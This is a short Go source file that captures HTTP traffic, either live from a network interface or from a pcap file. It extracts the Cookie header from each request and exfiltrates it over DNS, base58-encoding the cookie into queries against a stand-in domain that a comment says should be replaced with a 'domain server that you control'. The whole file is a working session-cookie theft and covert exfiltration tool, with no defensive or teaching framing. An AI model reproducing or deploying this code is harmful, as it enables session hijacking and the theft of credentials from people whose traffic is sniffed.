package main

import (
	"bufio"
	"bytes"
	"context"
	"flag"
	"fmt"
	"log"
	"net"
	"net/http"
	"time"

	"github.com/btcsuite/btcutil/base58"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func CustomDialer(ctx context.Context, network, address string) (net.Conn, error) {
	dialer := net.Dialer{}
	return dialer.DialContext(ctx, "udp", "127.0.0.1:53")
}

func DnsQuery(host string) {
	resolver := &net.Resolver{
		PreferGo: true,
		Dial:     CustomDialer,
	}

	ip, err := resolver.LookupHost(context.Background(), host)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Println(ip[0])
	}
}

func pumpOutChannel(messages chan string) {
	for cookie := range messages {
		// TODO domain server that you control
		dnsName := fmt.Sprintf("%s.example.org", base58.Encode([]byte(cookie)))
		DnsQuery(dnsName)
	}
}

func main() {
	var handle *pcap.Handle
	var err error

	messages := make(chan string)

	go pumpOutChannel(messages)

	fileName := flag.String("filename", "", "filename to read")
	devName := flag.String("device", "", "network device to read")
	bpfFilter := flag.String("filter", "tcp and port http", "BPF Filter")

	flag.Parse()

	if *fileName != "" && *devName == "" {
		handle, err = pcap.OpenOffline(*fileName)
	}

	if *devName != "" && handle == nil {
		// TODO arguments should be configurable
		handle, err = pcap.OpenLive(*devName, 65535, false, -1*time.Second)
	}

	if err != nil {
		log.Fatal(err)
	}

	defer handle.Close()
	defer close(messages)

	fmt.Println(*bpfFilter)

	if err := handle.SetBPFFilter(*bpfFilter); err != nil {
		log.Fatal(err)
	}

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	for packet := range packetSource.Packets() {
		if tcpLayer := packet.Layer(layers.LayerTypeTCP); tcpLayer != nil {
			tcp, _ := tcpLayer.(*layers.TCP)
			if len(tcp.Payload) > 0 {
				reader := bufio.NewReader(bytes.NewReader(tcp.Payload))
				httpReq, err := http.ReadRequest(reader)
				if err == nil {
					cookie := httpReq.Header.Get("Cookie")
					if cookie != "" {
						messages <- cookie
					}
				}
			}
		}
	}
}
